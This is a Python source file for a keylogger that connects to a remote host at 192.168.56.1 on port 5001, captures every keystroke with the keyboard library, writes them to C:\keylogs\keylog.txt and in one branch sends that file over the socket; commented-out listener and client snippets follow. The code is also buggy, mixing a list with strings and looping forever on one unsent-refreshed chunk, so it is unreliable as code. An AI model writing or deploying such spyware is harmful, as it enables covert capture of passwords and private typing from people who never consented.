import socket


s = socket.socket()

receiver_ip = '192.168.56.1'
port = 5001

s.connect((receiver_ip, 5001))


try:
    def keylogging():
        import os
        import keyboard
        keys = "".split()
        folder_path = r'C:\\keylogs'
        file_path = r'C:\\keylogs\\keylog.txt'
    
        
        if not os.path.exists(folder_path):
            os.makedirs(folder_path)
            
            while True:
                event = keyboard.read_event()
                if event.event_type == keyboard.KEY_DOWN:
                    keys += event.name
                    with open(file_path, "w") as f:
                        f.write(f"key:{keys}")
                        # break
                    
                with open(file_path, 'rb') as f:
                    data = f.read(1024)
                    while data:
                        s.send(data)
                    # data = f.read(1024)
    
        else:
            while True:
                event = keyboard.read_event()
                if event.event_type == keyboard.KEY_DOWN:
                    keys += event.name
                    # keys.append(event.name)
                with open(file_path, "w") as f:
                    f.write(f"key:{keys}")
                        # break
                
                
                # with open(file_path, 'rb') as f:
                #     while True:
                #         data = f.read(1024)
                #         s.send(data)
                    
        
    print("Connected to server!")

except OSError as e:
    print(f"Connection error: {e}")

finally:
    keylogging()
    s.close()
    
    

    
    
    
# s.listen(1)

# print("Socket Listening!")

# keys = "data is there!"

# while True:
#     c, addr = s.accept()
    
#     print('Got connected from: ', addr)

#     c.send(b'Thank you for connecting!')

#     c.close()
    
# import socket

# # Create a socket object
# s = socket.socket()

# # Define the server address and port
# host = '127.0.0.1'
# port = 3306

# # Connect to the server
# s.connect((host, port))

# # Receive data (up to 1024 bytes; adjust as needed)
# data = s.recv(1024)

# # Decode bytes to string and print
# print("Received message:", data.decode('utf-8'))

# # Close the connection
# s.close()